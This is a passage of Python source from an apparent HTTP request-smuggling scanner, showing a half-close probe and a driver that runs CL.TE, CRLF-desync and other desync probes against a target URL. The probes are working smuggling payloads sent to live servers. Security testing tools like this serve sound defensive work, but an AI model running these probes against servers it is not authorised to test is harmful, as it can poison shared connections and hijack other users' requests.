        hdr = _host_header(self.host, self.port, self.use_tls)

        body = f"GET /{marker} HTTP/1.1\r\nHost: {hdr}\r\n\r\n"
        probe = (
            f"POST {self.path} HTTP/1.1\r\n"
            f"Host: {hdr}\r\n"
            f"Content-Length: {len(body)}\r\n"
            f"Connection: keep-alive\r\n"
            f"\r\n"
            f"{body}"
        ).encode()

        sock = None
        raw_sock = None
        try:
            sock = _make_socket(self.host, self.port, self.use_tls)
            sock.sendall(probe)

            # Half-close the write side
            if self.use_tls:
                # For TLS we cannot half-close at the SSL layer cleanly;
                # grab the underlying socket for the shutdown.
                raw_sock = sock.unwrap()
                raw_sock.shutdown(socket.SHUT_WR)
                raw_sock.settimeout(_PROBE_TIMEOUT)
                chunks = []
                try:
                    while True:
                        chunk = raw_sock.recv(_READ_SIZE)
                        if not chunk:
                            break
                        chunks.append(chunk)
                except (socket.timeout, OSError):
                    pass
                resp = b"".join(chunks)
            else:
                sock.shutdown(socket.SHUT_WR)
                sock.settimeout(_PROBE_TIMEOUT)
                chunks = []
                try:
                    while True:
                        chunk = sock.recv(_READ_SIZE)
                        if not chunk:
                            break
                        chunks.append(chunk)
                except (socket.timeout, OSError):
                    pass
                resp = b"".join(chunks)

            resp_text = _decode(resp)

            # Check if we got two HTTP responses (the server processed the
            # smuggled request after the half-close)
            http_count = resp_text.count("HTTP/1.")
            if marker in resp_text and http_count >= 2:
                return SmuggleResult(
                    technique="Half-close abuse",
                    endpoint=f"{self.host}:{self.port}{self.path}",
                    confirmed=True,
                    confidence="medium",
                    probe_sent=_decode(probe),
                    response_snippet=_snippet(resp),
                    timing_ms=0,
                    detail=f"Half-close triggered processing of smuggled /{marker}",
                )
            return None
        except Exception as exc:
            self._log(f"Half-close error: {exc}")
            return None
        finally:
            for s in (raw_sock, sock):
                if s:
                    try:
                        s.close()
                    except OSError:
                        pass

    # -- public API --------------------------------------------------------

    def scan(self) -> List[SmuggleResult]:
        self._log("starting HTTP Terminator scan")
        probes = [
            ("CL.0", self._probe_cl0),
            ("0-CL", self._probe_0cl),
            ("Hop-by-hop TE", self._probe_hop_by_hop),
            ("H2C upgrade", self._probe_h2c_upgrade),
            ("Connection-state", self._probe_connection_state),
            ("Pipeline poison", self._probe_pipeline_poison),
            ("Half-close", self._probe_half_close),
        ]
        for name, fn in probes:
            self._log(f"probing {name}")
            result = fn()
            if result:
                self.results.append(result)
                self._log(f"{name} confirmed")
        return self.results


# ---------------------------------------------------------------------------
# 4. Top-level scan function
# ---------------------------------------------------------------------------

def run_smuggler_scan(target_url: str, verbose: bool = False) -> dict:
    """
    Run all three smuggling scanners against *target_url* and return a
    combined results dict.

    Returns::

        {
            "target": <url>,
            "scanners": {
                "http_smuggler": [SmuggleResult, ...],
                "crlf_desync":   [SmuggleResult, ...],
                "http_terminator": [SmuggleResult, ...],
            },
            "total_findings": <int>,
            "confirmed_count": <int>,
        }
    """
    host, port, path, use_tls = _parse_target(target_url)

    all_results = {
        "http_smuggler": [],
        "crlf_desync": [],
        "http_terminator": [],
    }

    # 1. Classic CL.TE / TE.CL / TE.TE
    try:
        smuggler = HTTPSmuggler(host, port, path, use_tls, verbose=verbose)
        all_results["http_smuggler"] = smuggler.scan()
    except Exception as exc:
        if verbose:
            print(f"  [smuggler] HTTPSmuggler failed: {exc}")

    # 2. CRLF desync
    try:
        crlf = CRLFDesyncScanner(host, port, path, use_tls, verbose=verbose)
        all_results["crlf_desync"] = crlf.scan()
    except Exception as exc:
        if verbose:
            print(f"  [smuggler] CRLFDesyncScanner failed: {exc}")

    # 3. HTTP Terminator (advanced techniques)
    try:
        terminator = HTTPTerminator(host, port, path, use_tls, verbose=verbose)
        all_results["http_terminator"] = terminator.scan()
    except Exception as exc:
        if verbose:
            print(f"  [smuggler] HTTPTerminator failed: {exc}")

    # Flatten for summary counts
    all_flat = []
    serialized = {}
    for scanner_name, results in all_results.items():
        serialized[scanner_name] = [asdict(r) for r in results]
        all_flat.extend(results)

    return {
        "target": target_url,
        "scanners": serialized,
        "total_findings": len(all_flat),
        "confirmed_count": sum(1 for r in all_flat if r.confirmed),
    }
